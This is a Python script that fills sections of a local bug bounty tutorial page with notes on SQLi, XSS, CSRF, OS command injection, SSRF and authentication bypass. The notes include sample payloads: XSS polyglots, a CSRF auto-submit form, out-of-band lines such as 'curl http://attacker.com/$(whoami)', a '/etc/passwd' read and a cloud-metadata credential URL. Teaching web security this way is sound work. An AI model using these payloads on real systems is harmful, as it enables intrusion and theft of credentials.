import re

with open('C:/BugBounty/bugbounty_tutorial.html', 'r', encoding='utf-8') as f:
    html = f.read()

def replace_section(html, section_id, title, old_content, new_content):
    pattern = r'(<div class="section" id="' + section_id + '">.*?<h2>.*?</h2>\n)(.*?)(<div class="lab-card")'
    replacement = r'\g<1>' + new_content + r'\n      \g<3>'
    return re.sub(pattern, replacement, html, flags=re.DOTALL)

# 1. SQLi Content
sqli_content = """
      <div class="skill-theory">
        <h3>Manual SQLi Methodology (bbp-sqli-hunter)</h3>
        <p>Before using automated tools, professionals map out databases manually using these steps:</p>
        
        <h4>1. Discovery (Error & Boolean Based)</h4>
        <ul>
          <li><strong>Fuzzing:</strong> Inject characters like <code>'</code>, <code>"</code>, <code>;</code>, <code>\\</code> into parameters.</li>
          <li><strong>Error-based:</strong> If you see "SQL syntax error", your input reached the database unescaped.</li>
          <li><strong>Boolean-based:</strong> Test logic: <code>?id=1 AND 1=1</code> (Normal) vs <code>?id=1 AND 1=2</code> (Missing data).</li>
        </ul>
        
        <h4>2. Filter Bypassing & WAF Evasion</h4>
        <ul>
          <li><strong>Space Evasion:</strong> Use <code>/**/</code>, <code>%09</code> (tab), or <code>%0a</code> (newline) instead of spaces. <em>(e.g., SELECT/**/username)</em></li>
          <li><strong>Quote Evasion:</strong> Use HEX encoding (<code>0x61646d696e</code> for 'admin') if quotes are blocked.</li>
        </ul>
      </div>
"""

# 2. XSS Content
xss_content = """
      <div class="skill-theory">
        <h3>Manual XSS Methodology (bbp-xss-hunter)</h3>
        <p>XSS allows execution of malicious JavaScript in the victim's browser context.</p>
        
        <h4>Core Types</h4>
        <ul>
          <li><strong>Reflected:</strong> Payload is immediately echoed back in the response (e.g., search queries).</li>
          <li><strong>Stored:</strong> Payload is saved in the database and executed later (e.g., comments).</li>
          <li><strong>DOM-based:</strong> Execution happens entirely on the client-side via vulnerable JS sinks (e.g., <code>innerHTML</code>).</li>
        </ul>
        
        <h4>Polyglot Payloads (Filter Bypass)</h4>
        <p>Use polyglots to break out of multiple contexts (HTML, attribute, JS) at once:</p>
        <pre><code>'">><script>alert(1)</script></code></pre>
        <pre><code>javascript://%250Aalert(1)//"onclick=alert(1)//<svg/onload=alert(1)></code></pre>
      </div>
"""

# 3. CSRF Content
csrf_content = """
      <div class="skill-theory">
        <h3>Manual CSRF Methodology</h3>
        <p>CSRF forces an authenticated user to execute unwanted actions.</p>
        
        <h4>1. Bypassing Defenses</h4>
        <ul>
          <li><strong>No Token:</strong> Easiest case, just forge the POST request.</li>
          <li><strong>Referer Check:</strong> Try omitting the Referer header (<code>&lt;meta name="referrer" content="never"&gt;</code>) or bypassing it by adding the target domain in the path (<code>http://attacker.com/victim.com</code>).</li>
        </ul>
        
        <h4>2. Building the Exploit</h4>
        <p>Host an auto-submitting form on an external site:</p>
        <pre><code>&lt;form action="https://target/change-email" method="POST"&gt;
  &lt;input type="hidden" name="email" value="hacker@evil.com"&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</code></pre>
      </div>
"""

# 4. OS Command Content
osc_content = """
      <div class="skill-theory">
        <h3>Manual OS Command Injection (bbp-osci-hunter)</h3>
        <p>Executing arbitrary system commands by escaping application logic.</p>
        
        <h4>1. Command Separators</h4>
        <p>Depending on the OS, use different separators to chain commands:</p>
        <ul>
          <li><strong>Linux:</strong> <code>;</code>, <code>|</code>, <code>||</code>, <code>&&</code>, <code>$(cmd)</code>, <code>`cmd`</code></li>
          <li><strong>Windows:</strong> <code>&</code>, <code>&&</code>, <code>|</code>, <code>||</code>, <code>%cmd%</code></li>
        </ul>
        
        <h4>2. Out-of-Band (OOB) / Blind</h4>
        <p>If the output isn't shown on screen, trigger a network request to your server:</p>
        <pre><code>& nslookup attacker.com</code></pre>
        <pre><code>| curl http://attacker.com/$(whoami)</code></pre>
        
        <h4>3. Space Bypass</h4>
        <p>If spaces are blocked, use <code>${IFS}</code> on Linux (e.g., <code>cat${IFS}/etc/passwd</code>).</p>
      </div>
"""

# 5. SSRF Content
ssrf_content = """
      <div class="skill-theory">
        <h3>Manual SSRF Methodology (bbp-ssrf-hunter)</h3>
        <p>Forcing the server to make requests to internal or external systems.</p>
        
        <h4>1. High-Value Targets</h4>
        <ul>
          <li><strong>Internal Admin Panels:</strong> <code>http://localhost/admin</code> or <code>http://127.0.0.1/admin</code></li>
          <li><strong>Cloud Metadata (AWS/GCP):</strong> <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code></li>
        </ul>
        
        <h4>2. Bypassing Filters</h4>
        <ul>
          <li><strong>Decimal IP:</strong> <code>http://2130706433/</code> (resolves to 127.0.0.1)</li>
          <li><strong>Octal IP:</strong> <code>http://0177.0.0.1/</code></li>
          <li><strong>DNS Rebinding:</strong> Point a custom domain to 127.0.0.1 (e.g., <code>http://localtest.me</code>).</li>
        </ul>
      </div>
"""

# 6. Auth Content
auth_content = """
      <div class="skill-theory">
        <h3>Authentication Bypass Methodology (bbp-auth-bypass)</h3>
        <p>Exploiting logical flaws in the authentication mechanism.</p>
        
        <h4>1. Username Enumeration</h4>
        <p>Analyze server responses for discrepancies when guessing usernames:</p>
        <ul>
          <li><strong>Different messages:</strong> "Invalid password" vs "User not found".</li>
          <li><strong>Response Times:</strong> Valid usernames might take longer to process due to password hashing.</li>
        </ul>
        
        <h4>2. Response Manipulation</h4>
        <p>If the client relies on server JSON, intercept the login response and change <code>{"success":false}</code> to <code>{"success":true}</code>.</p>
        
        <h4>3. Parameter Pollution & Type Confusion</h4>
        <p>Pass arrays or objects instead of strings (e.g., NoSQL injection): <code>password[$ne]=</code>.</p>
      </div>
"""

html = replace_section(html, 'sqli', 'SQL Injection (SQLi)', '', sqli_content)
html = replace_section(html, 'xss', 'Cross-Site Scripting (XSS)', '', xss_content)
html = replace_section(html, 'csrf', 'Cross-Site Request Forgery (CSRF)', '', csrf_content)
html = replace_section(html, 'os-command', 'OS Command Injection', '', osc_content)
html = replace_section(html, 'ssrf', 'Server-Side Request Forgery (SSRF)', '', ssrf_content)
html = replace_section(html, 'auth', 'Authentication Bypass', '', auth_content)

# Add some basic CSS for .skill-theory
if '.skill-theory' not in html:
    css = """
.skill-theory { background: var(--bg2); padding: 20px; border-radius: 8px; border-left: 4px solid var(--accent); margin-bottom: 24px; }
.skill-theory h3 { margin-top: 0; color: var(--accent); font-family: var(--font-display); }
.skill-theory h4 { color: var(--text); margin-top: 16px; margin-bottom: 8px; }
.skill-theory ul { margin-top: 8px; }
.skill-theory pre { background: var(--bg); padding: 10px; border-radius: 4px; margin-top: 8px; }
"""
    html = html.replace('/* === QUIZ & LAB SYSTEM === */', css + '\n/* === QUIZ & LAB SYSTEM === */')

with open('C:/BugBounty/bugbounty_tutorial.html', 'w', encoding='utf-8') as f:
    f.write(html)